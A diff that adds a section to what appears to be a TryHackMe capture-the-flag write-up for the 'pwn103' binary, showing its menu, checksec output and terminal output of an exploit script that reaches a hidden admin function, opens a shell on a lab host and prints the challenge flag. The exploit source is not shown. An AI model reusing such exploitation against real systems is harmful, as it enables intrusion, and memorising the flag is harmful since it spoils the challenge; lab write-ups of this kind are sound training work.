@@ -182,9 +182,223 @@ $
 
 ---
 
+# Challenge 3 - pwn103
+
+By running the binary we options to choose....
+
+I investigated all of the options, and the third is the most interesting.
+
+- General
+```bash
+❯ ./pwn103-1644300337872.pwn103
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  [THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1) 📢 Announcements
+2) 📜 Rules
+3) 🗣  General
+4) 🏠 rooms discussion
+5) 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 3
+
+🗣  General:
+
+------[jopraveen]: Hello pwners 👋
+------[jopraveen]: Hope you're doing well 😄
+------[jopraveen]: You found the vuln, right? 🤔
+
+------[pwner]:
+```
+
+---
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+let's run the exploit
+
+
+```bash
+❯ python3 exploit.py
+[*] '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 10.10.96.138 on port 9003: Done
+[*] Switching to interactive mode
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  [THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1) 📢 Announcements
+2) 📜 Rules
+3) 🗣  General
+4) 🏠 rooms discussion
+5) 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 
+🗣  General:
+
+------[jopraveen]: Hello pwners 👋
+------[jopraveen]: Hope you're doing well 😄
+------[jopraveen]: You found the vuln, right? 🤔
+
+------[pwner]: Try harder!!! 💪
+
+👮  Admins only:
+
+Welcome admin 😄
+[*] Got EOF while reading in interactive
+$ ls
+$ ls -la
+[*] Closed connection to 10.10.96.138 port 9003
+[*] Got EOF while sending in interactive
+❯ python3 exploit.py
+[*] '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 10.10.96.138 on port 9003: Done
+[*] Switching to interactive mode
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  [THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1) 📢 Announcements
+2) 📜 Rules
+3) 🗣  General
+4) 🏠 rooms discussion
+5) 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 
+🗣  General:
+
+------[jopraveen]: Hello pwners 👋
+------[jopraveen]: Hope you're doing well 😄
+------[jopraveen]: You found the vuln, right? 🤔
+
+------[pwner]: Try harder!!! 💪
+
+👮  Admins only:
+
+Welcome admin 😄
+
+👮  Admins only:
+
+➖➖➖➖➖➖➖➖➖➖➖
+1) 📢 Announcements
+2) 📜 Rules
+3) 🗣  General
+4) 🏠 rooms discussion
+5) 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 
+🗣  General:
+
+➖➖➖➖➖➖➖➖➖➖➖
+1) 📢 Announcements
+2) 📜 Rules
+3) 🗣  General
+4) 🏠 rooms discussion
+5) 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 
+🗣  General:
+
+------[jopraveen]: Hello pwners 👋
+------[jopraveen]: Hope you're doing well 😄
+------[jopraveen]: You found the vuln, right? 🤔
+
+------[pwner]: Try harder!!! 💪
+
+👮  Admins only:
+
+Welcome admin 😄
+
+👮  Admins only:
+
+Welcome admin 😄
+$ ls
+flag.txt
+pwn103
+pwn103.c
+$ cat flag.txt
+THM{w3lC0m3_4Dm1N}
+$
+```
 
 
 
